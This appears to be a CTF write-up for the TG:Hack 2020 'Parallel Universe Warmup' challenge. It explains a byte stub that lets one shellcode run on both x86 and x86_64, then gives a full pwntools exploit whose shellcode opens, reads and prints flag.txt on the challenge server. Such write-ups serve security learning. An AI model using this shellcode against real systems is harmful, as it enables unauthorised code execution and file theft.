---
layout: post
title: TG:Hack CTF 2020 - Parallel Universe Warmup
---

> Can you create shellcode that runs on x86 and x86_64 simultaneously? Read the flag in flag.txt. The following syscalls are allowed:
>
> open, read, write, close, exit_group, mmap
>
> nc parallel.tghack.no 6006
>
> Files: [repo][repo]

## Analysis

We need to write a shellcode that will be working on x86 and x86_64 linux systems at the same time. This can be achieved by using short architecture stub that will be detecting architecture on both systems and jumping to the right place in the shellcode.

{% highlight python %}
arch_stub = (
    b"\x31\xc9"
    b"\x41"
    b"\xe2\x3e"
)
{% endhighlight %}

On x86 linux it will translate to:
{% highlight shell_session %}
0xf7fce001                  xor    ecx, ecx
0xf7fce003                  inc    ecx
0xf7fce004                  loop   0xf7fce044
<x86 shellcode>:
  0xf7efe006                  push   0x7478
  0xf7efe00b                  push   0x742e6761
  continue executing ...
{% endhighlight %}

On x86_64 linux it will translate to:

{% highlight shell_session %}
0x7fb751ce4001                  xor    ecx, ecx
0x7fb751ce4003                  rex.B  loop 0x7fb751ce4044
<x86 shellcode>:
   ...
<x86_64 shellcode>
   0x7fb751ce4044:      mov    rdi,0x7478
   0x7fb751ce404b:      push   rdi
   continue executing ...
{% endhighlight %}

Basically for x86 the shellcode will continue executing while for x86_64 it will jump to x86_64 shellcode.

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./pwnme32')

host = args.HOST or 'parallel.tghack.no'
port = int(args.PORT or 6005)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()
io.recvuntil("Please give me some shellcode :))\n", timeout=10)

x86 = "\n".join([
    # open
    "push " + hex(u32("xt\x00\x00")),
    "push " + hex(u32("ag.t")),
    "push " + hex(u32("./fl")),
    "mov eax, 0x5",
    "mov ebx, esp",
    "mov ecx, 0x0",
    "mov edx, 0x0",
    "int 0x80",

    # read
    "mov ebx, eax", # fd
    "mov eax, 0x3", # read
    "mov ecx, esp",
    "mov edx, 0x20",
    "int 0x80",

    # write
    "mov eax, 0x4", # write 
    "mov ebx, 0x1", # stdout
    "int 0x80",
])

x64 = "\n".join([
    # open
    "mov rdi, " + hex(u32("xt\x00\x00")), 
    "push rdi",
    "mov rdi, " + hex(u64("./flag.t")), 
    "push rdi",

    "mov rax, 0x2",
    "mov rdi, rsp",
    "mov rsi, 0x0",
    "mov rdx, 0x0",
    "syscall",

    # read
    "mov rdi, rax", # fd
    "mov rax, 0x0",
    "mov rsi, rsp",
    "mov rdx, 0x20",
    "syscall",

    # write
    "mov rax, 0x1", # write
    "mov rdi, 0x1",
    "syscall",
])


arch_stub = (
    b"\x31\xc9"
    b"\x41"
    b"\xe2\x3e" 
)

context.clear()
context.update(arch = 'i386', os = 'linux')
asm86 = asm(x86, arch="i386", os="linux")

context.clear()
context.update(arch = 'amd64', os = 'linux')
asm64 = asm(x64, arch="amd64", os="linux")

payload = (
        arch_stub +
        asm86 +
        asm64
)
io.send(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/tghack/parallel-universe-warmup
